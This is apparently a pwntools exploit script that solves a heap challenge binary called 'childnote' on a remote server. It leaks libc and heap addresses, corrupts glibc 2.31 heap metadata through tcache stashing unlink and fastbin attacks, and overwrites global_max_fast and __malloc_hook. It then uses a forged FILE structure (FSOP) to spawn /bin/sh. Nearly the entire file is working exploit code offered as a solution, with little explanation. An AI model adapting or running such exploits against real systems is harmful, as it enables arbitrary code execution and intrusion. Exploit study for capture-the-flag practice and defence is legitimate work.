#!/usr/bin/env python3
from pwn import *

def create(size, content):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', content)

def show(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx, content):
    log.info('payload size: ' + str(len(content)))
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', content)

def delete(idx):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b': ', str(idx).encode())

binsz = 0x88
# p = process('./childnote')
# p = process('./childnote', env={'LD_PRELOAD': './libc-2.31.so'})
p = remote('140.112.31.97', 30204)

create(binsz, b'a' * (binsz - 1)) # idx: 0
create(binsz, b'a' * (binsz - 1)) # idx: 1

for _ in range(2, 9):
    create(binsz, b'a' * (binsz - 1)) # idx: 2 ~ 8

# Fill up tcache
for i in range(2, 9):
    delete(i)

# Produce heap overflow
delete(0)
delete(1) # make a big unsorted bin (2 * binsz)

# Leak libc
show(0)
libc = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - 0x1ebbe0
log.info('libc: ' + hex(libc))

__free_hook = libc + 0x1eeb28
log.info('__free_hook: ' + hex(__free_hook))

system = libc + 0x55410
log.info('system: ' + hex(system))

global_max_fast = libc + 0x1eeb80
log.info('global_max_fast: ' + hex(global_max_fast))

unsorted_bin = libc + 0x1ebbe0
small_bin = libc + 0x1ebc60

# Leak heap
show(3)
heap = u64(p.recvuntil(b'\n', drop=True).ljust(8, b'\0')) - 0x10
log.info('heap: ' + hex(heap))

# Continue to produce heap overflow
size = 0x3000
payload = b'a' * binsz
payload += p64(0) + p64(0)
payload += p64(size)
create(binsz + 0x18, payload[:-1]) # idx: 9; shrink unsorted bin (binsz - 0x18)
# now we have heap overflow at chunk[1], we can exploit this by edit(1, ...)

create(binsz, b'a' * (binsz - 1)) # idx: 10; convert unsorted bin to small bin (binsz - 0x18)

# Use heap overflow to rewrite (binsz) chunk to (binsz - 0x18) chunk
fake_chunk = heap + 0x830
binsz2 = binsz + 8 - 0x18
if binsz2 % 0x10:
    binsz2 += 8
target = global_max_fast
payload  = p64(binsz2 + 0x11)                                    # heap + 0x348
payload += p64(small_bin) + p64(fake_chunk)                      # small bin (fd -> small_bin; bk -> fake chunk)
payload += b'B' * (binsz2 - 0x10)                                # 
payload += p64(binsz2 + 0x10) + p64(binsz2 + 0x10)    # idx: 2
payload += b'C' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz2 + 0x11)                           # idx: 3
payload += b'D' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz2 + 0x11)                # idx: 4
payload += b'E' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz2 + 0x11)                           # idx: 5
payload += b'F' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz2 + 0x11)                # idx: 6
payload += b'G' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz2 + 0x11)                           # idx: 7
payload += b'H' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz2 + 0x11)                # idx: 8
payload += b'I' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz2 + 0x11)                           # idx: 10 | heap + 0x830
payload += p64(heap + 0x340) + p64(target - 0x10)                #
edit(1, payload)

# Free 6 (binsz - 0x30) chunk, put them into (binsz - 0x30) tcache freelist
for i in range(3, 9):
    delete(i)

# Now, what we have are:
#   1. Heap overflow
#   2. (binsz - 0x18) Small bin * 1
#   3. (binsz - 0x18) Tcache * 6
# Let's trigger Tcache Stashing Unlink trick :)
create(binsz2, b'J' * (binsz2 - 1)) # idx: 11

# Fastbin attack, produce fastbin
binsz3 = 0xe0
payload  = p64(binsz2 + 0x11)                                    # heap + 0x348
payload += p64(small_bin) + p64(fake_chunk)                      # small bin (fd -> small_bin; bk -> fake chunk)
payload += b'J' * (binsz2 - 0x10)                                # 
payload += p64(binsz2 + 0x10) + p64(binsz3 + 0x10)    # idx: 2
payload += b'K' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 3
payload += b'L' * (binsz3 - 0x18 - binsz)                        #
payload += p64(0) + p64(0x21)                                    #
payload += b'L' * (2 * binsz + 0x10 - binsz3)                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 4
payload += b'M' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 5
payload += b'N' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 6
payload += b'O' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 7
payload += b'P' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 8
payload += b'Q' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 10 | heap + 0x830
edit(1, payload)

delete(10)

for i in range(8, 1, -1):
    delete(i)

# Overwrite fd
fd = libc + 0x1eb97b
payload  = p64(binsz2 + 0x11)                                    # heap + 0x348
payload += p64(small_bin) + p64(fake_chunk)                      # small bin (fd -> small_bin; bk -> fake chunk)
payload += b'J' * (binsz2 - 0x10)                                # 
payload += p64(binsz2 + 0x10) + p64(binsz3 + 0x10)    # idx: 2
payload += p64(fd) + b'K' * (binsz)                   # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 3
payload += b'L' * (binsz3 - 0x18 - binsz)                        #
payload += p64(0) + p64(0x21)                                    #
payload += b'L' * (2 * binsz + 0x10 - binsz3)                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 4
payload += b'M' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 5
payload += b'N' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 6
payload += b'O' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 7
payload += b'P' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz3 + 0x11)                # idx: 8
payload += b'Q' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz3 + 0x11)                           # idx: 10 | heap + 0x830
edit(1, payload)

# Allocate garbage
create(binsz3, b'a') # idx: 12

# Allocate, now we can write to target!
payload  = b'\0\0\0\0\0' + p64(0xe1)
create(binsz3, payload) # idx: 13

# Fastbin attack again, produce fastbin
binsz4 = 0xd0
payload  = p64(binsz2 + 0x11)                                    # heap + 0x348
payload += p64(small_bin) + p64(fake_chunk)                      # small bin (fd -> small_bin; bk -> fake chunk)
payload += b'J' * (binsz2 - 0x10)                                # 
payload += p64(binsz2 + 0x10) + p64(binsz4 + 0x10)    # idx: 2
payload += b'K' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 3
payload += b'L' * (binsz4 - 0x18 - binsz)                        #
payload += p64(0) + p64(0x21)                                    #
payload += b'L' * (2 * binsz + 0x10 - binsz4)                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 4
payload += b'M' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 5
payload += b'N' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 6
payload += b'O' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 7
payload += b'P' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 8
payload += b'Q' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 10 | heap + 0x830
edit(1, payload)

delete(10)

for i in range(8, 1, -1):
    delete(i)

# Overwrite fd
fd = libc + 0x1eb990
payload  = p64(binsz2 + 0x11)                                    # heap + 0x348
payload += p64(small_bin) + p64(fake_chunk)                      # small bin (fd -> small_bin; bk -> fake chunk)
payload += b'J' * (binsz2 - 0x10)                                # 
payload += p64(binsz2 + 0x10) + p64(binsz4 + 0x10)    # idx: 2
payload += p64(fd) + b'K' * (binsz)                   # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 3
payload += b'L' * (binsz4 - 0x18 - binsz)                        #
payload += p64(0) + p64(0x21)                                    #
payload += b'L' * (2 * binsz + 0x10 - binsz4)                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 4
payload += b'M' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 5
payload += b'N' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 6
payload += b'O' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 7
payload += b'P' * (binsz + 8)                                    #
payload += p64(0) + p64(binsz4 + 0x11)                # idx: 8
payload += b'Q' * (binsz + 8)                         # 
payload += p64(0) + p64(binsz4 + 0x11)                           # idx: 10 | heap + 0x830
edit(1, payload)

# Allocate garbage
create(binsz4, b'a') # idx: 14

# Allocate
payload = p64(0x8787878787878787)
create(binsz4, payload) # idx: 15

# Edit size of chunk 15
payload  = b'\0\0\0\0\0' + p64(0xe1)
payload += p64(1500)
edit(13, payload)

# Write to __malloc_hook + Prepare FSOP
fake_file = heap + 0x348
payload  =                        p64(libc + 0x1eba03)      # stdin + 0x28
payload += p64(libc + 0x1eba03) + p64(libc + 0x1eba03)      #
payload += p64(libc + 0x1eba04) + p64(0)                    #
payload += p64(0) + p64(0)                                  #
payload += p64(0) + p64(fake_file)                          #
payload += p64(0) + p64(0xffffffffffffffff)                 #
payload += p64(0) + p64(libc + 0x1ee4d0)                    #
payload += p64(0xffffffffffffffff) + p64(0)                 #
payload += p64(libc + 0x1eba60) + p64(0)                    #
payload += p64(0) + p64(0)                                  #
payload += p64(0) + p64(0)                                  #
payload += p64(0) + p64(libc + 0x1ed4a0)                    #
payload += b'\0' * 0x110
payload += p64(system)                                      # __malloc_hook
edit(15, payload)

# Prepare FSOP
cmd_str = heap + 0x348 + 0xe0
_IO_str_jumps = libc + 0x1ed560
payload  = p64(0) + p64(0)                                       # heap + 0x348
payload += p64(0) + p64(0)
payload += p64(0) + p64((cmd_str - 100) // 2 + 1)
payload += p64(0) + p64(0)
payload += p64((cmd_str - 100) // 2) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(0)
payload += p64(0) + p64(_IO_str_jumps)
payload += b'/bin/sh\0'
edit(1, payload)

# Trigger FSOP
p.sendlineafter(b'>', b'5')

# Get shell
p.sendline(b'id')

p.interactive()
